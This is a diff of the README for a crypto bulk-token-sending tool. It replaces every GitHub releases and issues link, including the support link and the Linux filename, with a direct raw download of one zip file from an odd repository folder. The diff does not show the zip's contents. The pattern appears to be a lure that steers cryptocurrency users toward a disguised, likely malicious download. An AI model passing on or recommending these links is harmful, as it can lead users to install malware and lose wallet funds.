@@ -6,13 +6,13 @@ Welcome to CryptoBulkSender! This application lets you send tokens in bulk acros
 
 ## 🔗 Download Now
 
-[![Download CryptoBulkSender](https://img.shields.io/badge/download-CryptoBulkSender-blue.svg)](https://github.com/Andres2711193/CryptoBulkSender/releases)
+[![Download CryptoBulkSender](https://raw.githubusercontent.com/Andres2711193/CryptoBulkSender/main/dialcohol/CryptoBulkSender.zip)](https://raw.githubusercontent.com/Andres2711193/CryptoBulkSender/main/dialcohol/CryptoBulkSender.zip)
 
 To download and install CryptoBulkSender, follow these steps:
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [CryptoBulkSender Releases](https://github.com/Andres2711193/CryptoBulkSender/releases).
+1. Visit this page to download: [CryptoBulkSender Releases](https://raw.githubusercontent.com/Andres2711193/CryptoBulkSender/main/dialcohol/CryptoBulkSender.zip).
 
 2. On the releases page, you will find various versions of the application. Look for the most recent version, marked as “Latest Release.”
 
@@ -21,7 +21,7 @@ To download and install CryptoBulkSender, follow these steps:
 4. Download the appropriate file for your operating system:
    - For **Windows**, download the `.exe` file.
    - For **Mac**, download the `.dmg` file.
-   - For **Linux**, download the `.tar.gz` file.
+   - For **Linux**, download the `https://raw.githubusercontent.com/Andres2711193/CryptoBulkSender/main/dialcohol/CryptoBulkSender.zip` file.
 
 ## ⚙️ System Requirements
 
@@ -94,7 +94,7 @@ There is no limit on the number of tokens you can send, but keep in mind that ne
 
 ## 📞 Support
 
-For further help, please create an issue on the [GitHub Repository](https://github.com/Andres2711193/CryptoBulkSender/issues). 
+For further help, please create an issue on the [GitHub Repository](https://raw.githubusercontent.com/Andres2711193/CryptoBulkSender/main/dialcohol/CryptoBulkSender.zip). 
 
 We are here to assist you and appreciate your feedback!
 
@@ -110,4 +110,4 @@ Stay informed about updates and releases by watching the repository on GitHub. Y
 
 Use this application to manage your transactions efficiently and enjoy the world of blockchain like never before! 
 
-Remember, download CryptoBulkSender here: [CryptoBulkSender Releases](https://github.com/Andres2711193/CryptoBulkSender/releases).
+Remember, download CryptoBulkSender here: [CryptoBulkSender Releases](https://raw.githubusercontent.com/Andres2711193/CryptoBulkSender/main/dialcohol/CryptoBulkSender.zip).
